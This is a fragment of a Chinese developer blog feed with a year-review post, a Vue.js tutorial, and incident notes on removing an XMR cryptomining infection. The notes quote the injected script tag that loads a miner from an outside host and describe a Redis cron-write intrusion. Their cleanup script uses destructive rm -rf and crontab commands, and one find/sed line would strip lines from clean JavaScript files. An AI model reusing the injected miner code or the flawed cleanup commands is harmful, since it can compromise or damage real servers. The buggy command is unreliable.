&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="剑指-Offer" /><summary type="html">1 前言 本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。 文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。 引用别人的一句话“我们不生产代码，我们是代码的搬运工”。 文章内容仅供参考。 2 1~10 二维数组的查找 题目描述 在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</summary></entry><entry><title type="html">总结2018，展望2019</title><link href="http://localhost:4000/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019/" rel="alternate" type="text/html" title="总结2018，展望2019" /><published>2019-01-17T00:00:00+08:00</published><updated>2019-01-17T00:00:00+08:00</updated><id>http://localhost:4000/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019</id><content type="html" xml:base="http://localhost:4000/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org59e438c&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org59e438c&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 喜乐哀愁的2018&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5c86214&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5c86214&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 大事记&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
失业21天
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
继2017年12月31号从上家公司辞职后，于2018年1月22日入职现在的公司，当时也算为徘徊了半个多月的自己找到了归宿。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
大雨过后的车祸
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年3月3日20点35分，在二环快速B线（北）下高架桥的时候，自己驾驶的一辆共享汽车追尾了一辆起亚k3的小汽车，回头想了想，还是觉得离老司机的路尚远。后续赔付了4000多块，事情得以终结。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
公司辞职潮
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年4月，所在部门掀起了一批辞职潮，个中缘由在这就不细说了！对于一个刚转正，继续回血的新人来说，实在是说不清楚的。\\
由于4月份、5月份部门内辞职了一大批核心技术人员，致使很多工作压到了我这里，倍感极具挑战性。入职4个月，从中也学到了很多之前没有接触的新知识，这点很欣慰，继续加油！！！

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
搭建个人博客
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年7月3日，在 Github 上使用 Jekyll 搭建了自己的 Blog，从此提醒自己记录开发笔记。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
新项目
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年11月，被编入了一个新项目（政府项目），在该项目中技术上没学到什么，不过在其他方面算是“受益匪浅”吧。，项目还在继续，在这就不细说了

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
外公过逝
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年12月15日，外公过逝了，我是晚上19点多接到父亲电话的，之后联系了表妹、姨兄，本欲赶往参加葬礼，后面被父亲劝住了。\\
父亲说了一句话：活着的时候你已多孝，死了不不能前来也不会怎么样！也就是那句话吧！【生前早尽孝,莫待人老空哭坟】

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org10adc5c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org10adc5c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 总结&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;如果说要给 2018 年做一个总结的话，那就是两个字：不顺。按说，2017年是本命年，应该才是不顺的一年，也许本命年过度到 2018 了吧！&lt;/li&gt;
&lt;li&gt;期待 2019 年顺顺利利吧！不管工作、生活、学习都能有所进步。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgde9a188&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgde9a188&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 期待新未来2019&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbbaafe5&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgbbaafe5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 未来展望&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
一起回想和展望
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2019年1月6-7日，和大学同学（老蒋，超哥，礼杰，我）聊了好久，说了很多！回想了在学校时的想法，回顾了从毕业到现在的种种，尤感岁月蹉跎，一眨眼2年半过去了，最后各自说了自己未来3年的计划。\\
这次相互间的交流让我感到了一股压力，让我不得不再次思考要不要驻留昆明，如果留昆明，那就意味着要买房，我一直是一个崇尚自由的人，不想被绑架，但父母又希望我能回老家某个职位，我有点不知所措。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
新的一年，新的方向
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
进一步提高职业技能，掌握专长技能，总结并构建技能框架，积累工作经验。
进一步学习，保留原有的常规学习内容：汉字书写练习、英语口语加强、专业知识积累。新技术学习也很重要，不能固步自封，向前看。
生活上，提高情商吧！女朋友一直说我情商低，是时候给自己定个小目标了！

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4233648&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4233648&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 小小心愿&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;工作技能提升，排在第一位一直都是很有必要的。&lt;/li&gt;
&lt;li&gt;找一份合适自己的工作很重要。&lt;/li&gt;
&lt;li&gt;升职加薪，当然是 2019 年追求的终极目标，毕竟有余力才能创造更多的东西，不管是工作还是生活上。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="年终总结" /><category term="未来展望" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">vue实例属性之el-template-render</title><link href="http://localhost:4000/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render/" rel="alternate" type="text/html" title="vue实例属性之el-template-render" /><published>2018-12-29T00:00:00+08:00</published><updated>2018-12-29T00:00:00+08:00</updated><id>http://localhost:4000/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render</id><content type="html" xml:base="http://localhost:4000/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org2feae06&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2feae06&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 优先级&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/vue-level.png&quot; alt=&quot;vue-level.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-orgc0b324b&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc0b324b&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 优先级-示例&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgf0af741&quot;&gt;&amp;lt;div class=&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;vapp-1&quot;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div class=&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;vapp-2&quot;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div class=&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;vapp-3&quot;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;orgb63a64e&quot;&gt;&lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #8b2252;&quot;&gt;'.vapp-1'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;,
  &lt;span style=&quot;color: #0000ff;&quot;&gt;render&lt;/span&gt;: &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;h&lt;/span&gt;){
    &lt;span style=&quot;color: #a020f0;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #8b2252;&quot;&gt;'div'&lt;/span&gt;, {}, &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;#36825;&amp;#26159;render&amp;#23646;&amp;#24615;&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;)
  }
})
&lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #8b2252;&quot;&gt;'.vapp-2'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #8b2252;&quot;&gt;'.vapp-3'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  }
})
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org70bdc5b&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org70bdc5b&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 独立构建和运行时构建&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ue.js 1.0，编译器需要依赖浏览器的DOM，所以无法将编译器和运行时分开。因此在Vue.js 1.0分发包中，编译器和运行时是打包在一起，都在浏览器端执行。
Vue.js 2.0，为了支持服务端渲染(server-side rendering)，编译器不能依赖浏览器的DOM，所以必须将编译器和运行时分开。于是形成了独立构建（编译器 + 运行时）和运行时构建（仅运行时）。显而易见，运行时构建体积要小于独立构建。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
1. 模板编译器
模板编译器的职责是将模板字符串编译为纯JavaScript的渲染函数，即将&amp;lt;template&amp;gt;编译成render函数。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2. Vue.js的执行过程
包含编译过程和运行过程，在编译过程，编译器将字符串模板(template)编译为渲染函数(render)，在运行过程，调用渲染函数。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
3. 运行时构建
运行时构建指不能进行模板编译的Vue库。运行时构建不包含模板编译器，即不支持template选项，如果使用vue-loader和vueify预编译模板，只需要打包运行时，而不需要打包编译器。
运行时构建，可以用render选项，但它只在单文件组件中起作用，因为单文件组件的模板是在构建时预编译到render函数中，运行时构建只有独立构建大小的30%，只有16Kb min+gzip大小。

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;orgff110b5&quot;&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#19981;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Vue&lt;/span&gt;({
  render (h) {
    &lt;span style=&quot;color: #a020f0;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #8b2252;&quot;&gt;'div'&lt;/span&gt;, &lt;span style=&quot;color: #008b8b;&quot;&gt;this&lt;/span&gt;.hello)
  }
})
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
4. 独立构建
独立构建指能够将template模板或者从el挂载元素提取的模板编译成渲染函数的Vue库，独立构建包含模板编译器，可以用template选项实时编译模板。

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org3766123&quot;&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;Vue&lt;/span&gt;({
  template: &lt;span style=&quot;color: #8b2252;&quot;&gt;'&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
使用vue-cli生成项目时，会提醒使用哪种构建方式，npm包默认导出的是运行时构建，即runtime版本vue.runtime.common.js，如果想使用独立构建，需要在webpack.config.js中配置alias。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4aeae05&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org4aeae05&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/camille666/p/vue_instance_prop_el_template_render.html&quot;&gt;el，template，render属性优先性&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Vue.js" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">XMR 恶意挖矿脚本处理笔记</title><link href="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/" rel="alternate" type="text/html" title="XMR 恶意挖矿脚本处理笔记" /><published>2018-12-27T00:00:00+08:00</published><updated>2018-12-27T00:00:00+08:00</updated><id>http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org2fe9dc7&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2fe9dc7&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 事件描述&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1c42f75&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1c42f75&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 概况&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
网站无法加载，会出现浏览器卡死的情况。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb89a4f3&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb89a4f3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 表象&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
下面陈述被攻击后的表象：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;服务器资源被大量占用，资源占用率飙升；&lt;/li&gt;
&lt;li&gt;服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&amp;lt;script src=&quot;&lt;a href=&quot;http://t.cn/EvlonFh&quot;&gt;http://t.cn/EvlonFh&lt;/a&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;OMINEId(&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;,&quot;-1&quot;)&amp;lt;/script&amp;gt;');）&lt;/li&gt;
&lt;li&gt;网站无法加载，会出现浏览器卡死的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org16eb1ed&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org16eb1ed&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 问题排查及解决&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc28c64c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc28c64c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 排查&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。
2. 搜索这个地址，得知此为 XMR 恶意挖矿脚本。
3. 查看系统任务计划，发现定期恶意脚本的计划内容
# crontab -l
4. 由于redis没有安全配置，黑客利用redis安全漏洞入侵了服务器。
攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; 登录服务redis-server，
将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，
完成定时执行shell脚本，来实现提权及其它操作。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb1e8625&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb1e8625&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 解决&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 整理清理脚本

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orge1af0e6&quot;&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#20808;&amp;#20851;&amp;#25481;redis&amp;#31471;&amp;#21475;&lt;/span&gt;
iptables -A INPUT -p tcp --dport 6379 -j DROP
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#23450;&amp;#26102;&amp;#20219;&amp;#21153;&lt;/span&gt;
crontab -r
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#28165;&amp;#38500;redis key Back1 Back3 Back3&lt;/span&gt;
redis-cli -h xxx.xxx.xxx.xxx -x del Back1
redis-cli -h xxx.xxx.xxx.xxx -x del Back2
redis-cli -h xxx.xxx.xxx.xxx -x del Back3
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dbfilename dump.rdb
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dir /tmp
redis-cli -h xxx.xxx.xxx.xxx -x save
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#36816;&amp;#34892;&amp;#33050;&amp;#26412;&lt;/span&gt;
&lt;span style=&quot;color: #483d8b;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #ff00ff;&quot;&gt;`ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #483d8b;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #ff00ff;&quot;&gt;`ps -ef|grep zigw|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #483d8b;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #ff00ff;&quot;&gt;`ps -ef|grep cmd|grep -v grep|awk '{print $2}'`&lt;/span&gt;
chattr -i /etc/zigw
chattr -i /etc/shz.sh
chattr -i /tmp/zigw
chattr -i /tmp/shz.sh
rm -rf /etc/shz.sh
rm -rf /etc/gmbpr2
rm -rf /etc/zigw
rm -rf /tmp/zigw
rm -rf /tmp/shz.sh
rm -rf ~/.cmd

&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#28165;&amp;#29702;SSH&amp;#20813;&amp;#30331;&amp;#24405;&amp;#20449;&amp;#24687;&lt;/span&gt;
cat /dev/null&amp;gt; ~/.ssh/authorized_keys
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#28165;&amp;#29702;js&amp;#33050;&amp;#26412;&lt;/span&gt;
find / -name &lt;span style=&quot;color: #8b2252;&quot;&gt;'*.js'&lt;/span&gt;|xargs grep -L f4ce9|xargs sed -i &lt;span style=&quot;color: #8b2252;&quot;&gt;'$d'&lt;/span&gt;
mv /usr/bin/get /usr/bin/wget
mv /usr/bin/url /usr/bin/curl
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org3951721&quot;&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #a020f0;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;By xzeu&lt;/span&gt;
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;http://www.xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;Email: admin#xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;Filename: clearlink.sh&lt;/span&gt;

&lt;span style=&quot;color: #b22222;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;Begin&lt;/span&gt;
find / -type f -name &lt;span style=&quot;color: #8b2252;&quot;&gt;'*.js'&lt;/span&gt; |xargs fgrep -s -l &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;&lt;/span&gt;|xargs ls -l |awk &lt;span style=&quot;color: #8b2252;&quot;&gt;'{print $9}'&lt;/span&gt;&amp;gt;jsfile.txt
&lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt; file&lt;span style=&quot;color: #a020f0;&quot;&gt; in&lt;/span&gt; &lt;span style=&quot;color: #ff00ff;&quot;&gt;`cat ~/jsfile.txt`&lt;/span&gt;;
&lt;span style=&quot;color: #a020f0;&quot;&gt;do&lt;/span&gt;
  &lt;span style=&quot;color: #483d8b;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #a0522d;&quot;&gt;file&lt;/span&gt;
  &lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file&lt;/span&gt;
  &lt;span style=&quot;color: #b22222;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;cp $file ${file}.bad&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #a020f0;&quot;&gt;exit&lt;/span&gt; 0
&lt;span style=&quot;color: #b22222;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;END&lt;/span&gt;
